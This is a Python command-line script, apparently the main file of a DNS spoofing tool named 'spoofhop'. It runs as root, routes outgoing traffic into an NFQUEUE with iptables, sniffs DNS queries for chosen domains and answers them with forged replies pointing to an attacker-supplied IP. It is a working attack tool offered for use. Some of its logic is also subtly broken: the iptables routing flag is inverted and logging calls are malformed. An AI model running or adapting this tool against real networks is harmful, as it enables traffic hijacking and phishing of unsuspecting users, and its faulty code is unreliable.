#!/usr/bin/python3


#=CUSTOM LIBS=
from spoofhop_libs import sniff_dns
from spoofhop_libs import send_dns_reply
#=============
import argparse
import os
import sys
import blessed 

def main():
    print(r"""
                                  ...                                      
                           .:^^~~~!!7?JYYJ7~.                              
                                         .~JPGY~.                          
                          .^7J5PGGGGGP5J!:.  .!PB5^                        
                      .~YGBBPY?!~^^~~7?5GBBP?:  :Y#P~                      
                    :YBBP7:  .:^!777!~^:..^JG#G7. :P#5.                    
                  .Y#B?. .~YGGPY?!~~~!7JYY!. ^5#B!  J#B^                   
                 !BBJ. :YBBJ^            .~5?  ~G#Y  ?BB^                  
                ?BB~ .YBB!  .^:  .~7??7~:   ^P: .GBY  5BG.                 
               !BB: :G#5. :?^  7PBBBBBBBBG?. .5. ^BB^ ^BB7                 
              .BB~ .GB5  7Y  .GBBBBBBBBBBBBG: ^~  GB7 .BB5   ___              
              ?#5  JBB: !G   YBBBBBBBBBBBBBBP .^  PB! .BBY       | \         
              5B~  PBG  GJ   5BBBBBBBBBBBBBBP    :BB. 7BB!  ..  ___           
              5B:  GBG  G5   :GBBBBBBBBBBBBB^    P#! .GBG   !.             
              ?#^  YBB: JB^   .JGBBBBBBBBBY.   .PB~ .GBB:  ^?     |          
              :BJ  ^BB5  PB^    .^7?YYJ7^.   .?GY. ~GBG:  :P.       |       
               ?B.  7BBJ  Y#Y.  .....    .^7Y57. ^P#B?   !P.     ___ _          
                JG   7BB5. ^PB5~.  .:^^~~~^:..:?G#G?.  :5Y.                
                 7P.  ^P#B7. :?GBPY7~^::^~!JPBBGJ^   ^5P~         | |         
                 _:J~   ~P#BY^  .^7J5PPGPP5J7^.   ^JG5~          /          
            _       :!:   :?GBBP?~:..........^!JPG5!.         ____ ___               
        _ |   _       ..     .~?5GGBGGGGGGGGP5J!:                    |      
     /_     ___     __   _         ...::...   ___    _|_ __  |    _____
   _ __  __ _   |__   ___  _|___ ____  _ |    ___  ___         _       
 __      ____     _ _       _              _   _      _    _   
/ ___|  |  _ \   / _ \   / _ \  |  ___|     | | |  /   \  |  _ \ 
\_ _ \    |_) | | | |   | | | | | |_      | |_| |   | | | | |_) |
 ___) | |  __/  | |_| | | |_| | |  _|        _  | | |_| |    __/ 
| __ /  |_|      \___/   \___/  |_|       |_| |_|  \_ _/  |_|    
                                                                


    """.strip())

    if os.path.isfile(arguments.domain_list):
        arguments.domain_list = [line.strip() for line in open(arguments.domain_list).read().split('\n')]

    else:
        arguments.domain_list = [domain.strip() for domain in arguments.domain_list.split(':')]

    log.print("Sniffing DNS packets...", "info")

    for (domain_name,packet) in sniff_dns.packet_sniffing_generator(arguments.domain_list):

        if domain_name in arguments.domain_list:
            
            log.print(f"Spoofing {domain_name} --> {arguments.spoof_ip}", "success")
            send_dns_reply.reply(packet, arguments.spoof_ip, verbose=False)




class log:

    def print(self, message, level, return_string=False):
        format_map = {
            "debug":   f"{self.blessed.grey}- {message}    {self.blessed.normal}",
            "info":    f"{self.blessed.blue}[i] {message}  {self.blessed.normal}",
            "success": f"{self.blessed.green}[+] {message} {self.blessed.normal}",
            "warning": f"{self.blessed.yellow}[!] {message}{self.blessed.normal}",
            "error":   f"{self.blessed.red}[-] {message}   {self.blessed.normal}"
        }

        if list(format_map.keys()).index(self.log_level) <= list(format_map.keys()).index(level):
    
            log_message = format_map[level]
    
    
            if return_string:
                return log_message
    
            else:
                print(log_message)


    def __init__(self):
        self.blessed   = blessed.Terminal()

        if arguments.debug_level.lower() not in 'debug info success warning error'.split(' '):
            self.log_level = 'error'
            exit_gracefully(self, f"Invalid debug level \"{arguments.debug_level.lower()}\"", "error")

        self.log_level = arguments.debug_level.lower()



def exit_gracefully(*args):
    log.print(*args)
    if os.getuid() == 0 and not arguments.dont_autoroute:
        os.system("iptables -F OUTPUT")

    sys.exit()



argumentparser = argparse.ArgumentParser()

argumentparser.add_argument(
    '--debug-level', 
    help='Amount of information displayed.', 
    default='info'
    )
argumentparser.add_argument(
    '-d', '--domain-list',
    help='List of domains to spoof (either a text file or in this format example1.com:example2.com:example3.com)',
    required=True
    )
argumentparser.add_argument(
    '-s', '--spoof-ip',
    help='IPv4 address to send as a response to the domains', 
    required=True
    )
argumentparser.add_argument(
    '--dont-autoroute',
    help="Doesn't automatically route traffic to nfqueue.",
    action='store_true'
    )

arguments = argumentparser.parse_args()



if __name__ == "__main__":

    log = log()
    if os.getuid() != 0:
        exit_gracefully("Program must be run as root", "error")
    
    if arguments.dont_autoroute:
        os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 1")

    try:
        main()

    except KeyboardInterrupt:
        log.print("KeyBoardInterrupt detected!", "warning")
    
    except Exception as e:
        log.print(e, "error")

    finally:
        exit_gracefully("Exiting...", "success")
